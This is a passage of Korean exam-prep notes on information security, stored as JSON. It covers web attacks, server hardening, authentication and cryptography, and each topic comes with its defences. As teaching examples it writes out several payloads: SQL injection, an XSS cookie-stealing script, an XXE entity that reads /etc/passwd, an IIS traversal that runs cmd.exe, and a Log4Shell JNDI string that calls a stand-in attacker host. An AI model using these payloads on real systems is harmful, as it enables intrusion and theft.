**TOCTOU(Time Of Check ~ Time Of Use)** — 자원을 **검사하는 시점**과 **사용하는 시점** 사이의 시간차를 노려, 그 사이에 심볼릭 링크 등으로 자원을 바꿔치기\n- **조건** : 주로 **SetUID(root 권한)** 프로그램이 임시 파일을 다룰 때 발생\n- **대응** : 임시 파일 생성 시 **O_CREAT|O_EXCL** 플래그로 원자적 생성, umask 설정, 심볼릭 링크 여부 확인(lstat), 파일명 대신 **파일 디스크립터** 사용, 임시 파일 무작위 이름 사용","added":false,"hasAdd":true},{"title":"HeartBleed / POODLE  (SSL/TLS 취약점)","star":true,"body":"- **HeartBleed** : OpenSSL의 Heartbeat 확장 취약점. 메모리 정보(개인키·세션 등)가 유출됨\n  - Snort 탐지 시 `content:\"|18 03 00|\"` (SSLv3 Heartbeat), `content:!\"|00|\"`(부정 조건 `!` 주의) 등으로 매칭\n- **POODLE** : TLS 연결을 **SSL 3.0으로 다운그레이드**시킨 뒤 패딩 오라클 취약점으로 암호문 해독 → **SSL 3.0 사용 중지**로 대응","added":false},{"title":"방화벽 유형 (구현 방식별)","star":false,"body":"- **패킷 필터링** : 3·4계층에서 IP·Port·Protocol 헤더 검사 (빠름, 정교한 제어 어려움)\n- **상태 검사(Stateful Inspection)** : 세션 상태 테이블로 연결 추적 (현재 표준)\n- **애플리케이션 게이트웨이(Proxy)** : 7계층에서 서비스별 프록시로 검사 (정교, 느림, 서비스별 프록시 필요)\n- **회선 게이트웨이(Circuit Gateway)** : 세션 계층에서 동작, SOCKS 방식\n- **구축 유형** : 스크리닝 라우터 / 배스천 호스트 / 스크린드 호스트 / **스크린드 서브넷(DMZ 구성, 가장 안전)**","added":true}]}]},{"num":3,"title":"애플리케이션·웹 보안","sections":[{"title":"웹 공격","items":[{"title":"SQL 인젝션","star":false,"body":"- **개념** : 외부 입력값이 검증 없이 SQL 쿼리에 직접 결합되어, 악의적 SQL 구문으로 인증 우회 또는 DB 무단 조회·수정·삭제하는 취약점\n- **예시** : `' or '1'='1` 입력으로 WHERE 절을 항상 참으로 만들어 로그인 우회\n- **기출 예제**\n  - 원 쿼리 : `SELECT password FROM user WHERE id='soojebi'` → id가 soojebi인 사용자의 password를 조회\n  - 삽입 문자열 : **`' or '1'='1`**\n  - 결과 : `WHERE id='soojebi' or '1'='1'` 형태가 되며, `'1'='1'`은 무조건 참이므로 **WHERE 절 전체가 참** → **모든 사용자의 패스워드 획득 가능**\n- **대응 — Prepared Statement** ★\n  - **개념** : 쿼리를 **최초 1회만 분석·최적화**하여 템플릿으로 저장하고, 입력값을 **매개변수(바인딩 변수)**로만 처리 (일반 Statement는 실행 때마다 쿼리 파싱 → 비효율·취약)\n  - **방어 원리** : 사용자 입력이 **SQL 명령의 일부가 아닌 데이터(매개변수)**로 처리되어 코드 구조 변경 불가\n    - 예: `PreparedStatement stmt = conn.prepareStatement(\"INSERT INTO student VALUES(?)\"); stmt.setString(1, user);`\n    - `user`에 `Robert'); DROP TABLE students;--` 를 넣어도 문자열 그대로 컬럼 값으로 입력됨","added":false},{"title":"XSS (Cross Site Scripting)","star":false,"body":"- **개념** : 권한 없는 사용자가 다른 사용자 정보를 추출하기 위해 웹 사이트에 스크립트를 삽입하는 공격\n- **유형**\n  - **Stored XSS(저장형)** : 악성 스크립트를 웹 애플리케이션의 **DB에 저장**해 두었다가, 이를 조회하는 다른 사용자에게 실행시켜 정보를 탈취하거나 리다이렉션\n  - **Reflected XSS(반사형)** : 악성 스크립트를 포함한 **악성 URL을 클릭**하면, 서버 **응답에 그대로 반사**되어 스크립트가 실행되며 정보 탈취·리다이렉트\n  - **DOM Based XSS** : 스크립트가 DOM을 제어하는 과정에서 조작 가능할 때 발생 (서버를 거치지 않고 클라이언트 측에서 실행)\n- **대응** : 입력값 필터링, 출력 시 인코딩(이스케이프), 스크립트 태그 제한, **HttpOnly** Flag 설정, 웹 방화벽 적용\n- **점검 스크립트** : `<script>alert(document.cookie)<\/script>` — 필터링/인코딩 미흡 시 쿠키가 노출되면 취약","added":false},{"title":"CSRF (Cross Site Request Forgery, 사이트 간 요청 위조)","star":true,"body":"- **개념** : 사용자가 **자신의 의지와는 무관하게** 공격자가 의도한 행위(정보 변경, 게시글 작성, 송금 등)를 특정 웹 사이트에 **요청**하게 만드는 공격\n- **XSS와의 차이** : XSS는 사용자 브라우저에서 **스크립트를 실행**시키는 공격 / CSRF는 **인증된 사용자의 권한으로 요청 자체를 위조**하는 공격\n- **대응 방안**\n  - **Referer 검증** : Referer를 확인하여 **같은 도메인에서 들어온 요청이 아니면 차단**\n  - **CSRF 토큰** : 사용자 **세션에 임의의 난수 값을 저장**하고, 요청마다 해당 난수를 포함시켜 전송·검증\n  - **재인증** : 중요 기능(비밀번호 변경·송금 등)에 대해 **재인증**을 통해 안전하게 요청 여부 확인","added":false},{"title":"SSRF (Server Side Request Forgery)","star":false,"body":"- **개념** : 서버 간 요청에 검증되지 않은 외부 입력값을 허용하여, 공격자가 신뢰받는 서버를 매개로 임의의 서버·내부 리소스에 요청을 보내는 취약점\n- **위험성** : 내부망 스캔, 내부 자원 접근, 클라우드 메타데이터 탈취\n- **대응**\n  - **화이트 리스트 필터링** : 사용자 입력 기반 요청 생성 시\n  - **블랙 리스트 필터링** : 무작위 입력값 사용 시","added":false},{"title":"HTTP Request Smuggling","star":false,"body":"- 서버 간 요청 처리 방식의 차이를 이용해 악의적 요청을 정상 요청 속에 숨겨 전송하는 공격\n\n::보강::\n- **원인** : **프론트엔드(프록시·LB)**와 **백엔드 서버**가 요청의 끝을 판단하는 기준(`Content-Length` vs `Transfer-Encoding: chunked`)을 다르게 해석하는 불일치\n- **유형** : **CL.TE** / **TE.CL** / **TE.TE** (두 헤더 처리 우선순위 차이 악용)\n- **영향** : 다른 사용자 요청에 악성 요청 삽입, 인증 우회, 캐시 오염, WAF 우회\n- **대응** : 두 헤더 동시 존재 시 요청 거부, 프론트·백엔드 **HTTP 처리 방식 통일**, HTTP/2 사용, 모호한 요청 정규화","added":false,"hasAdd":true},{"title":"HTTP Response Splitting (응답 분할)","star":false,"body":"- **정의** : 사용자 입력을 응답 헤더에 포함할 때 필터링이 미흡하여 응답이 여러 개로 분할되는 취약점\n- **악용 문자** : **CR(%0D)**, **LF(%0A)**\n- **위험성** : XSS 수행, 웹 캐시 오염(Cache Poisoning)","added":false},{"title":"운영체제 명령어 삽입 (OS Command Injection)","star":true,"body":"- **개념** : 검증되지 않은 사용자 입력이 **OS 명령어의 일부로 전달**되어 의도하지 않은 시스템 명령이 실행되는 취약점\n- **대응** : 입력값 필터링, **화이트리스트 기반 명령어**만 허용, 셸 메타문자(`; | & $` 등) 차단","added":false},{"title":"XXE (XML External Entity, XML 외부 개체 주입)","star":true,"body":"- **개념** : XML 파서가 **외부 엔티티 참조를 허용**할 때, 공격자가 URI를 조작하여 시스템 파일 접근·SSRF·DoS를 유발 (OWASP Top 10)\n- **유형 1 — 정보 노출** : `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` 처럼 외부 엔티티로 **시스템 파일 접근**\n- **유형 2 — DoS (Billion Laughs)** : 엔티티가 다른 엔티티를 재귀 참조(`lol1→lol2→…`)하여 **기하급수적 확장**으로 자원 고갈\n- **대응** : 외부 엔티티·DTD 처리 **비활성화**, XML 파서 보안 설정","added":false},{"title":"파일 삽입 공격 (File Inclusion)","star":false,"body":"- **개념** : 공격자가 악성 서버 스크립트를 서버에 전달하여 실행되도록 하는 취약점\n- **대응** : `include` 등 구문 검증, `php.ini`에서 `allow_url_fopen`을 **off**로 설정\n\n::보강::\n- **유형 구분** ★\n  - **LFI (Local File Inclusion)** : 서버 내부 파일을 포함시켜 노출(예: `../../etc/passwd` 경로 조작). **디렉터리 트래버설**과 결합\n  - **RFI (Remote File Inclusion)** : **외부 URL**의 악성 스크립트를 포함·실행 → 웹셸 업로드, 원격 코드 실행\n- **추가 대응** : 사용자 입력을 파일 경로에 직접 사용 금지, **화이트리스트**로 포함 파일 제한, `allow_url_include=off`, 경로 순회 문자(`../`) 필터링","added":false,"hasAdd":true},{"title":"파일 업로드 공격","star":false,"body":"- **정의** : 업로드 파일의 확장자·MIME 타입 검증이 미흡하여 악성 파일(웹셸)을 업로드하는 취약점\n- **우회 기법** : HTTP 요청 시 **Content-Type을 변경**하여 검사 우회\n- **공격 성공 조건**\n  - 파일 확장자 검사가 없거나 불완전\n  - 업로드 파일이 스크립트 실행 권한 있는 디렉터리에 저장\n  - Content-Type 값만 검사(클라이언트 조작 가능)\n- **`.htaccess` 대응 설정** ★\n  - **FilesMatch + Deny** : 특정 확장자(`.ph`, `.lib`, `.sh` 등) Server Side Script의 **직접 URL 호출 금지** → 업로드된 웹셸 실행 방지\n    ```apache\n    <FilesMatch \"\\.(ph|lib|sh)$\">\n      Order Allow,Deny\n      Deny from all\n    <\/FilesMatch>\n    ```\n  - **AddType** : `AddType text/html .php .phtml …` → 스크립트 확장자의 MIME을 **실행 불가한 text/html로 재조정**하여 실행 방지\n- **`LimitRequestBody`** : 업로드 가능한 **최대 파일 크기(byte) 제한** (예: `LimitRequestBody 5000000` ≈ 5MB) → 대용량 웹셸 업로드·과부하 방지","added":false},{"title":"크리덴셜 스터핑 (Credential Stuffing)","star":false,"body":"- **개념** : 공격자가 (유출 등으로) 확보한 로그인 자격 증명을 **다른 인증 시스템의 계정에 무작위로 대입**하여 사용자의 계정을 탈취하는 공격\n- **성립 이유** : 여러 사이트에서 동일한 ID·패스워드를 재사용하기 때문\n- **대응** : 다중 인증(MFA) 적용, 패스워드 재사용 금지, 로그인 시도 임계치·CAPTCHA 적용","added":false},{"title":"퍼징 (Fuzzing)","star":true,"body":"- **개념** : 소프트웨어에 문제를 일으킬 수 있는 **다양한 데이터를 입력**하여 에러·충돌 등의 **반응을 분석**해 취약점을 찾아내는 기법\n- **특징** : 보안 취약점 탐지를 목적으로 하는 **무작위 테스트 방식**으로, **하드웨어·소프트웨어 모두에 적용 가능**","added":false},{"title":"OWASP Top 10 (2021)","star":false,"body":"- **정의** : 웹 애플리케이션에서 가장 빈번·심각한 보안 위험 10가지를 선정한 OWASP 표준 목록\n- **주요 항목 (2021)**\n  1. 취약한 접근 통제(Broken Access Control)\n  2. 암호화 실패(Cryptographic Failures)\n  3. 인젝션(Injection, SQLi·XSS 등)\n  4. 안전하지 않은 설계(Insecure Design)\n  5. 보안 설정 오류(Security Misconfiguration)\n  6. 취약하고 오래된 컴포넌트\n  7. 식별 및 인증 실패\n  8. SW·데이터 무결성 실패\n  9. 보안 로깅·모니터링 실패\n  10. **SSRF**","added":true},{"title":"웹셸 (Web Shell)","star":true,"body":"- **정의** : 공격자가 원격에서 웹 서버 명령을 실행하기 위해 업로드하는 **악성 스크립트 파일**(jsp/php/asp 등)\n- **침투 경로** : 파일 업로드 취약점, 파일 삽입(File Inclusion) 취약점\n- **탐지·대응**\n  - 업로드 디렉터리의 스크립트 실행 권한 제거 (`.htaccess` 설정)\n  - 웹셸 탐지 도구(휘슬 WHISTL 등) 정기 점검\n  - 파일 확장자 화이트리스트 검증, 업로드 경로와 실행 경로 분리","added":true},{"title":"클릭재킹 (Clickjacking)","star":false,"body":"- **정의** : 투명한 `iframe`을 정상 페이지 위에 겹쳐, 사용자가 의도하지 않은 버튼·링크를 클릭하도록 유도하는 공격(UI Redressing)\n- **대응** : **X-Frame-Options** 헤더(DENY/SAMEORIGIN), CSP `frame-ancestors`, 프레임버스팅 스크립트","added":true}]},{"title":"웹 보안 설정","items":[{"title":"쿠키와 세션 (개념 비교)","star":true,"body":"- **쿠키 (Cookie)** : 클라이언트가 방문한 웹 사이트와 관련해 **로컬(클라이언트)에 저장**되는 **키와 값**이 들어있는 데이터 파일\n- **세션 (Session)** : 클라이언트별로 각각의 **상태 정보를 서버에서 저장**하는 기술","added":false},{"title":"쿠키 보안 설정값","star":true,"body":"- **Secure** : SSL/TLS 통신 시에만 쿠키 전송(기밀성 보장) → **스니핑을 통한 쿠키 탈취** 대응\n- **HttpOnly** : 자바스크립트(`document.cookie`)를 통한 쿠키 접근 차단 → **XSS를 통한 세션 탈취** 대응\n- **Expires / Max-Age** : 만료 시간 설정으로 탈취 시 빠르게 무효화\n- **SameSite** : 크로스 사이트 요청 시 쿠키 전송 제한 → **CSRF** 완화","added":false},{"title":"robots.txt (크롤러 제어)","star":false,"body":"- 크롤러로부터 사이트를 제어하는 파일. **루트 디렉터리**에 위치하며 특정 페이지·디렉터리 수집 금지 지시\n\n::보강::\n- **형식 예시**\n```\nUser-agent: *\nDisallow: /admin/\nDisallow: /private/\nAllow: /public/\n```\n- **보안 관점 주의** : robots.txt는 **강제력이 없는 권고**일 뿐, 악성 크롤러는 무시함. 오히려 **관리자 페이지·백업 경로 등 민감 디렉터리를 노출**시키는 정보 유출 통로가 될 수 있음\n- **권장** : 민감 경로는 robots.txt에 적지 말고 **인증·접근통제**로 보호. 노출 방지가 목적이면 `<meta name=\"robots\" content=\"noindex\">` 병행","added":false,"hasAdd":true},{"title":"디렉터리 인덱싱 / Options 지시자","star":true,"body":"- **디렉터리 인덱싱** : `Options`의 **Indexes** 때문에 index 파일이 없을 때 파일 목록이 자동 노출 → 조치: `Indexes` 제거(또는 `-Indexes`)\n- **FollowSymLinks** : 심볼릭 링크를 통해 웹 허용 범위 밖 디렉터리 접근 가능 → 조치: `-FollowSymLinks`\n- **상위 디렉터리 접근(`../`)** : 경로 조작으로 상위 디렉터리의 중요 파일 접근 가능\n- **AllowOverride** : `none`이면 `.htaccess` 무시 → 필요 시 `AuthConfig`/`All` 로 설정","added":false},{"title":"Apache 로그 및 주요 설정","star":true,"body":"- **로그 종류**\n  - **Access 로그** : 정상 접속 기록 / **Error 로그** : 접속 에러 기록\n  - 로그 경로 정보 확인 파일 : **`httpd.conf`** (`ErrorLog \"경로\"`로 에러 로그 위치 지정)\n- **요청 로그 예시** : `\"GET /read.php?no=101&item=book HTTP/1.1\" 200`\n  - `no=101&item=book`(2개 파라미터), `200`(정상 처리), **Referer**(직전 접속 사이트)\n- **주요 설정 지시자**\n  - `Timeout 300` : 300초 동안 무통신 시 연결 종료\n  - `MaxKeepAliveRequests 100` : KeepAlive 시 연결당 최대 요청 수 제한\n  - `DirectoryIndex index.htm index.html index.php` : 디렉터리 접근 시 인식할 인덱스 파일 **순서**\n  - `ErrorLog \"경로\"` : 에러 로그 파일 위치 지정","added":false},{"title":"HTTP Method 확인 (OPTIONS)","star":true,"body":"- **OPTIONS** : 웹 서버가 **지원하는 HTTP Method**(GET/POST/TRACE 등)를 확인하는 메서드\n  - `telnet [서버] 80` 후 `OPTIONS * HTTP/1.0` → 응답 `Allow:` 헤더에 지원 메서드 표시\n- **보안** : 불필요한 **TRACE**(XST 공격), **PUT/DELETE** 메서드는 비활성화 권장","added":false},{"title":"유니코드 취약점 (원격 명령 실행)","star":true,"body":"- **개념** : IIS 등에서 `..%c1%1c..`, `..%c0%af..` 같은 **유니코드 인코딩**으로 경로를 우회하여 `cmd.exe` 등 시스템 명령을 실행\n- 로그 예: `GET /script/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\\` → 응답 `404`면 **실패**, `200`이면 성공\n- **대응** : 웹서버 최신 패치, IIS를 OS 드라이브(C:)와 **분리된 드라이브**에 설치, 입력값 필터링, 화이트리스트 명령어, IPS 차단룰","added":false},{"title":"Log4j 취약점","star":false,"body":"- 아파치 로깅 서비스의 자바 기반 로깅 유틸리티\n- **JNDI + LDAP**을 이용해 로그 기록 위치에 값을 추가하여 임의 Java 코드 실행 → 시스템 완전 제어\n\n::보강::\n- **정식 명칭** : **Log4Shell (CVE-2021-44228)**, CVSS **10.0 (최고 심각도)**\n- **원리** : 로그로 남기는 문자열에 `${jndi:ldap://attacker/exploit}` 형태를 삽입 → Log4j가 **JNDI 조회**를 수행하며 공격자 서버에서 악성 클래스를 내려받아 실행(**RCE**)\n- **대응** : Log4j **2.17.1 이상**으로 업그레이드, `log4j2.formatMsgNoLookups=true` 설정, 취약 JndiLookup 클래스 제거, 아웃바운드 LDAP/RMI 차단","added":false,"hasAdd":true},{"title":"XML 조회 및 검증 시 고려사항","star":false,"body":"- 공통 검증 컴포넌트를 이용하여 입력값을 검증 (XXE·XML 인젝션 방지)\n\n::보강::\n- **주요 XML 공격**\n  - **XXE (XML External Entity)** : 외부 엔티티 선언(`<!ENTITY ... SYSTEM \"file:///etc/passwd\">`)을 악용해 **서버 내부 파일 노출·SSRF·DoS**\n  - **XML Injection** : XML 구조에 태그를 주입해 데이터 변조\n  - **XML 폭탄(Billion Laughs)** : 엔티티 중첩 참조로 메모리 고갈(DoS)\n- **대응** : 파서에서 **외부 엔티티·DTD 처리 비활성화**, 입력값 검증, 스키마(XSD) 검증, 최신 파서 사용","added":false,"hasAdd":true},{"title":"메일 보안 — 스팸 릴레이 제한","star":true,"body":"- **설정 파일 3종 (기출)**\n  - **`sendmail.cf`** : sendmail의 주 설정 파일. 릴레이 제한 관련 옵션을 설정\n  - **`access`** : 릴레이 **허용/차단 대상**(IP·도메인)을 기술하는 텍스트 파일\n  - **`access.db`** : `access` 파일을 `makemap` 명령으로 변환한 **DB 파일** (sendmail이 실제로 참조)\n    - 예: `makemap hash /etc/mail/access.db < /etc/mail/access`\n- **access 파일 주요 키워드**\n  - **RELAY** : 릴레이 허용\n  - **DISCARD** : 메일을 조용히 폐기 (발신자에게 알리지 않음)\n  - **REJECT** : 메일 거부 (에러 반환)\n  - **OK** : 다른 조건과 관계없이 수신 허용","added":false},{"title":"IIS 응답 헤더 제거 (URL Rewrite)","star":true,"body":"- **URL Rewrite 모듈** : IIS 관리자에서 **아웃바운드 규칙(Outbound Rules)** 설정으로 특정 **HTTP 응답 헤더를 제거·변경**할 때 사용하는 모듈\n- **목적** : `Server`, `X-Powered-By`, `X-AspNet-Version` 등 **서버·기술 정보 노출 헤더 제거** → 배너 그래빙·버전 정보 노출 방지","added":false},{"title":"SSL/TLS 취약 프로토콜 점검 (Fiddler 활용)","star":true,"body":"- **HTTPS 복호화가 되지 않는 원인**\n  - Fiddler **Root CA 인증서 미설치(미신뢰)**\n  - **Decrypt HTTPS traffic** 설정 비활성화\n- **조치(도구 설정)** : [Tools] → [Options] → [HTTPS] 탭 → `Decrypt HTTPS traffic` 체크 + `Trust the Fiddler Root certificate` 적용\n- **발견 취약점** : 클라이언트가 **SSLv3 호환 ClientHello** 전송 → 프로토콜 **다운그레이드** 유발 (**POODLE** 위험)\n- **조치(서버 설정)** : **SSL 3.0 / TLS 1.0 / TLS 1.1 사용 중지**, **TLS 1.2 이상**만 허용","added":false},{"title":"보안 HTTP 응답 헤더","star":false,"body":"- **X-Frame-Options** : `DENY`/`SAMEORIGIN` → 프레임 삽입 차단(**클릭재킹** 방어)\n- **X-Content-Type-Options** : `nosniff` → MIME 스니핑 차단\n- **Content-Security-Policy (CSP)** : 로드 가능한 리소스 출처 제한 → **XSS** 완화\n- **Strict-Transport-Security (HSTS)** : HTTPS 강제 → SSL 스트리핑 방어\n- **X-XSS-Protection** : 브라우저 XSS 필터 활성화(구형 브라우저)","added":true}]},{"title":"모바일 보안","items":[{"title":"BYOD 모바일 오피스 보안 기술","star":false,"body":"- **MDM (Mobile Device Management)** : 스마트폰·휴대용 기기를 관리하는 보안 시스템\n- **컨테이너화** : 실행환경을 격리(가상 샌드박스)하여 그 안에서만 기밀 정보 접근·업무 앱 구동\n- **모바일 가상화** : 한 기기에 동일 OS의 다중 인스턴스를 제공, 업무용·개인용 두 모드 동시 사용","added":false},{"title":"딥링크 (Deep Link)","star":false,"body":"- **정의** : 모바일 앱에서 특정 콘텐츠·기능으로 직접 연결하는 링크\n- **취약점** : 악용 시 앱 내 민감정보(카드정보·주소 등) 노출 가능","added":false},{"title":"인증서 고정 (Certificate Pinning)","star":false,"body":"- **정의** : 사전에 정한 특정 인증서·공개키만 유효한 것으로 인정하도록 강제하는 기법\n- **방어 대상** : 중간자(MITM) 공격\n- **고정 요소** : ① 고정할 인증서(공개키) ② 인증서 관리(보관·갱신·검증) ③ 오동작·로그 관리\n- **우회 방안** : ① Frida 등 후킹 도구 ② 앱 수정으로 검증 로직 우회 ③ 신뢰할 수 있는 중간 CA 설치","added":false}]},{"title":"SW 개발 보안","items":[{"title":"분석 단계 산출물","star":false,"body":"- 요구사항 정의서 / 요구사항 추적표 / 유즈케이스 명세서 / 유즈케이스 다이어그램","added":false},{"title":"보안 테스트 기법 (블랙박스 / 화이트박스)","star":true,"body":"- **블랙박스 테스트** : 소스 코드를 **보지 않고** 외부 인터페이스·구조를 분석하여 취약점 발견\n- **화이트박스 테스트** : 개발된 **소스 코드를 직접 분석**하여 코딩상 취약점 발견\n- ※ \"실행 여부(동적/정적 분석)\"가 아니라 \"**소스 코드를 보느냐**\"를 물으면 블랙박스/화이트박스가 정답","added":false}]}]},{"num":4,"title":"정보보안 일반 (암호·접근통제·솔루션)","sections":[{"title":"접근통제","items":[{"title":"접근통제 정책 (DAC / MAC / RBAC)","star":false,"body":"- **DAC (임의적)** : 사용자·그룹에 근거한 **사용자 중심** 접근 제어\n- **MAC (강제적)** : 정보의 **비밀 수준(보안 레벨)**에 근거, 허용된 사용자만 접근\n- **RBAC (역할 기반)** : 사용자·객체 관계를 **역할**에 따라 접근 제어","added":false},{"title":"정보보호 통제 방안","star":false,"body":"- **예방 통제 (Preventive Control)** : 오류나 부정 발생을 **예방할 목적**으로 행사하는 통제. 잠재적 위험 요소를 사전에 제거하는 **선제적·능동적** 통제\n- **물리적 접근 통제 (Physical Access Control)** : 관계자 이외의 사람이 특정 시설·설비에 접근하는 것을 제한하는 통제\n- **논리적 접근 통제 (Logical Access Control)** : 승인되지 않은 사람이 **네트워크를 통해** 자산에 접근하지 못하도록 하는 통제","added":false}]},{"title":"인증·계정 관리","items":[{"title":"EAM과 IAM","star":false,"body":"- **공통 기능** : 통합인증(**SSO**)과 권한 부여, 자원 관리, 보안 정책을 수립한 인증 시스템\n- **EAM (Extranet Access Management)**\n  - **관리 대상** : 업무 시스템(Windows·Linux 서버, Database 등) 계정 및 애플리케이션 계정의 **권한**\n  - **단점** : 관리자가 직접 권한을 관리하여 **관리 비용 증가**, 계정을 **수동 생성**하여 운영 비용 증가\n- **IAM (Identity & Access Management)**\n  - **개선 부분** : 조직 전체 사용자 **계정의 자동 생성·관리**, 정책에 따른 **권한 부여·회수 자동화**","added":false},{"title":"사용자 인증 3요소 / OTP / SSO","star":true,"body":"- **인증 3요소**\n  - **지식 기반(Something you know)** : 패스워드, PIN\n  - **소유 기반(Something you have)** : OTP, 스마트카드, 인증서\n  - **존재/생체 기반(Something you are)** : 지문·홍채·얼굴\n  - (+ 행위 기반: 서명·걸음걸이)\n- **OTP** : 매 인증마다 바뀌는 일회용 비밀번호. **시간 동기화(Time)** 방식 / **이벤트 동기화(Counter)** 방식 / 질의응답(Challenge-Response) 방식\n- **SSO (Single Sign-On)** : 한 번 인증으로 여러 시스템 접근. **인증 서버·통합 계정** 필요 (Kerberos, SAML)\n- **MFA** : 서로 다른 2개 이상 요소를 조합(다중 인증)","added":true}]},{"title":"암호화·데이터 보호","items":[{"title":"해시 암호화 (Hash)","star":true,"body":"- **개념** : 임의의 길이를 갖는 데이터를 **고정된 길이의 데이터로 매핑**하는 **단방향** 암호화 방식 → **역계산(복호화) 불가능**\n- **알고리즘** : MD5, SHA-1, SHA-256, SHA-512 등\n- **용도** : 패스워드 저장, 무결성 검증, 전자서명\n- **특성** : 일방향성 / 충돌 회피성 (서로 다른 입력이 동일한 해시값을 갖기 어려움)\n- **보완** : 레인보우 테이블·무차별 대입 공격 대응을 위해 **솔트(Salt)**, **키 스트레칭** 적용","added":false},{"title":"종단간 암호화 (E2EE)","star":false,"body":"- **정의** : 전송 중은 물론 서비스 제공자 서버 저장 시에도 암호화 상태를 유지하여, 송·수신자 외에는 내용을 볼 수 없게 하는 기술\n- **특징** : 서비스 제공자조차 평문을 볼 수 없음 (메신저 앱 등)\n\n::보강::\n- **동작 원리** : 각 단말이 **키 쌍**을 보유하고, 상대 **공개키로 암호화** → 수신자만 **개인키로 복호화**. 중간 서버는 암호문만 중계\n- **구간 암호화와 비교** : TLS(전송구간 암호화)는 서버 도착 시 **평문으로 복호화**되지만, E2EE는 서버에서도 **평문 불가**\n- **활용·한계** : 시그널·왓츠앱 등 메신저. 서버가 내용을 못 보므로 **불법·유해 콘텐츠 필터링·수사 협조가 어려운** 점이 정책적 쟁점","added":false,"hasAdd":true},{"title":"TLS 1.3 / DTLS","star":true,"body":"- **TLS 1.3** : 핸드셰이크를 간소화하여 암호화 시간 단축\n  - **최초 연결 시 1-RTT**, **세션 재개 시 0-RTT**(Round Trip Time)\n- **DTLS (Datagram TLS)** : **UDP 기반**에서 SSL/TLS와 유사한 보안을 제공하는 경량 프로토콜 (IoT·CoAP 환경)","added":false},{"title":"데이터베이스 암호화 방식","star":false,"body":"- **API 방식** : 암복호화 모듈이 API 라이브러리 형태로 **애플리케이션 서버**에 설치, 응용 프로그램이 호출\n- **Plug-in 방식** : 암복호화 모듈이 **DB 서버**에 설치, DBMS가 Plug-in으로 호출\n- **TDE 방식** : **DBMS 내장** 암호화 기능으로 암복호화 처리","added":false},{"title":"데이터 마스킹 기법","star":false,"body":"- **정적 데이터 마스킹 (Static Data Masking)**\n  - 입력된 민감정보 패턴을 **저장 시점**에 규칙대로 **영구적으로** 마스킹\n  - 예: 운영 DB의 주민등록번호를 개발 DB로 이관하며 뒷자리를 영구 변환\n- **동적 데이터 마스킹 (Dynamic Data Masking)**\n  - DB 서버로 전달되는 **SQL 문장을 자동으로 변경**하여 마스킹\n  - 예: 실제 DB에는 완전한 값이 저장되어 있으나 **화면상에는 일부만 `*`로 표시**","added":false},{"title":"대칭키 암호 알고리즘","star":true,"body":"- **정의** : 암·복호화에 **동일한 키** 사용. 빠르나 키 분배·관리 문제\n- **블록 암호**\n  - **DES** : 64bit 블록 / 56bit 키 (취약, 사용 안 함)\n  - **3DES** : DES 3회 반복\n  - **AES** : 128bit 블록 / 128·192·256bit 키 (현 국제 표준, Rijndael)\n  - **SEED** : 한국 KISA 개발 128bit 블록\n  - **ARIA** : 국가정보원·학계 공동 개발 국내 표준 128bit 블록\n  - **HIGHT** : 경량 환경(RFID·IoT)용 국산 64bit 블록\n- **스트림 암호** : **RC4**(WEP 사용, 취약), A5 등 — 비트 단위 암호화","added":true},{"title":"비대칭키(공개키) 암호 알고리즘","star":true,"body":"- **정의** : **공개키로 암호화, 개인키로 복호화**(기밀성) / **개인키로 서명, 공개키로 검증**(인증·부인방지)\n- **알고리즘**\n  - **RSA** : 소인수분해의 어려움에 기반 (가장 널리 사용)\n  - **ECC** : 타원곡선 이산대수 문제. 짧은 키로 동일 안전성 → **모바일·IoT** 적합\n  - **Diffie-Hellman** : 최초의 공개키 방식, **키 교환** 전용(이산대수 문제)\n  - **ElGamal, DSA** : 이산대수 기반\n- **대칭키 대비** : 키 분배 용이·부인방지 가능 / **속도 느림** → 실제로는 하이브리드(키교환=공개키, 데이터=대칭키)","added":true},{"title":"블록 암호 운영 모드 (ECB/CBC/CTR 등)","star":false,"body":"- **ECB (Electronic Codebook)** : 블록을 독립 암호화 → 동일 평문=동일 암호문(**패턴 노출, 취약**)\n- **CBC (Cipher Block Chaining)** : 이전 암호문 블록과 XOR 후 암호화. **IV(초기화벡터)** 필요, 병렬 복호화 가능\n- **CFB / OFB** : 블록 암호를 스트림 암호처럼 사용\n- **CTR (Counter)** : 카운터 값을 암호화해 평문과 XOR. **병렬 처리** 가능, IV/Nonce 사용\n- **GCM** : CTR + 인증(무결성) 결합 → 기밀성 + 무결성 동시 제공 (현재 널리 사용)","added":true},{"title":"전자서명 (Digital Signature)","star":true,"body":"- **개념** : 송신자의 **개인키로 서명**, 수신자가 송신자의 **공개키로 검증**\n- **제공 서비스** : **무결성 / 인증 / 부인방지** (※ 기밀성은 미제공)\n- **과정** : 원문 해시 → 해시값을 송신자 개인키로 암호화(=서명) → 원문+서명 전송 → 수신자가 공개키로 복호화한 해시와 직접 계산한 해시 비교\n- **요구 조건** : 위조 불가, 부인 불가, 재사용 불가, 변경 불가, 서명자 인증","added":true},{"title":"PKI / 공인인증서 (X.509)","star":false,"body":"- **PKI (공개키 기반구조)** : 공개키 암호의 신뢰성을 보장하기 위한 인증서 발급·관리 체계\n- **구성** : **CA(인증기관, 인증서 발급)** / RA(등록기관) / **디렉터리(저장소)** / 사용자\n- **X.509 인증서 필드** : 버전 / 일련번호 / 서명 알고리즘 / 발급자(CA) / 유효기간 / 주체 / **주체 공개키** / CA의 전자서명\n- **폐지 관리** : **CRL**(인증서 폐지 목록) / **OCSP**(실시간 상태 확인 프로토콜)","added":true}]},{"title":"이메일 보안","items":[{"title":"스팸 메일 인증 기술 (SPF / DKIM / DMARC)","star":true,"body":"- **SPF (Sender Policy Framework)** : 발신 도메인 DNS에 **TXT 레코드로 등록된 허용 IP**와 실제 발신 IP를 대조 → 발신자 위조 검증 (Mail Envelope의 발송자 주소 검증)\n- **DKIM (DomainKeys Identified Mail)** : **발신 서버가 개인키로 메일 헤더를 전자서명**하고, 수신 서버가 발신 도메인 DNS의 **공개키(TXT)**로 검증 → 무결성·발신자 조작 여부 확인\n- **DMARC** : **SPF + DKIM을 결합**하고, 인증 실패 시 처리 정책(수신·격리·거부)과 리포팅을 규정","added":false},{"title":"PGP (Pretty Good Privacy)","star":false,"body":"- 필 짐머만 개발. PEM보다 보안성은 낮으나 구현 프로그램이 공개되어 **가장 널리 사용**되는 이메일 보안 기술 (기밀성·무결성·인증·부인방지)\n\n::보강::\n- **핵심 동작** : **하이브리드 방식** — 본문은 **대칭키(세션키)**로 암호화하고, 그 세션키를 수신자 **공개키**로 암호화해 함께 전송\n- 